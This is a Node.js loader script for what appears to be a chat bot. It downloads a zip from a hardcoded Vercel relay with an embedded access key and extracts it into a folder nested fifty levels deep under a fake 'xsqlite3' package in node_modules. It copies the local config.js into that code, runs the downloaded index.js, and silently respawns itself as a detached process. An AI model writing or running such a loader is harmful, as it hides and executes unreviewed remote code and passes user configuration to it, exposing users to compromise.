require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { fork, spawn } = require('child_process');

// ========== ENV FILE FUNCTION ==========
const ENV_FILE = path.join(__dirname, ".env");

function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) {
    try {
      fs.writeFileSync(
        ENV_FILE,
        "# Auto-generated .env file\nSESSION_ID=\n"
      );
    } catch (e) {
      return;
    }
  }

  try {
    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
    const envLines = envContent.split('\n');
    
    envLines.forEach(line => {
      const trimmedLine = line.trim();
      if (!trimmedLine || trimmedLine.startsWith('#')) return;
      
      const equalsIndex = trimmedLine.indexOf('=');
      if (equalsIndex !== -1) {
        const key = trimmedLine.substring(0, equalsIndex).trim();
        const value = trimmedLine.substring(equalsIndex + 1).trim();
        const cleanValue = value.replace(/^['"](.*)['"]$/, '$1');
        
        if (!process.env[key]) {
          process.env[key] = cleanValue;
        }
      }
    });
  } catch {}
}

// ========== VERCEL RELAY LOADER ==========
const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://june-vercel.vercel.app/api/repo';
const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41-183-184';

const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

function createDeepRepoPath() {
  let deepPath = baseFolder;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }
  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });
  return repoFolder;
}

async function downloadAndExtractRepo(repoFolder) {
  try {
    const response = await axios.get(VERCEL_RELAY_URL, {
      responseType: 'arraybuffer',
      headers: {
        'x-access-key': ACCESS_KEY,
        'User-Agent': 'tech word-md-loader'
      },
      timeout: 20000
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);
  } catch (err) {
    process.exit(1);
  }
}

function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'config.js');
  try {
    if (fs.existsSync(configSrc)) {
      fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
    }
  } catch {}
}

// Silent restart handler
function silentRestart() {
  setTimeout(() => {
    const newProcess = spawn(process.argv[0], [process.argv[1]], {
      detached: true,
      stdio: 'ignore',
      env: process.env
    });
    newProcess.unref();
    process.exit(0);
  }, 1000);
}

function launchBot(botPath) {
  const child = fork(botPath, [], {
    env: process.env,
    stdio: 'inherit'
  });

  child.on('exit', () => silentRestart());
  child.on('error', () => silentRestart());

  return child;
}

// ========== MAIN ==========
(async () => {
  try {
    loadEnvFile();

    const repoFolder = createDeepRepoPath();
    await downloadAndExtractRepo(repoFolder);

    const subDirs = fs
      .readdirSync(repoFolder)
      .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

    if (!subDirs.length) {
      process.exit(1);
    }

    const extractedRepoPath = path.join(repoFolder, subDirs[0]);
    copyConfigs(extractedRepoPath);

    const botIndex = path.join(extractedRepoPath, 'index.js');
    if (!fs.existsSync(botIndex)) {
      process.exit(1);
    }

    launchBot(botIndex);

    process.on('SIGINT', () => process.exit(0));
  } catch {
    process.exit(1);
  }
})();
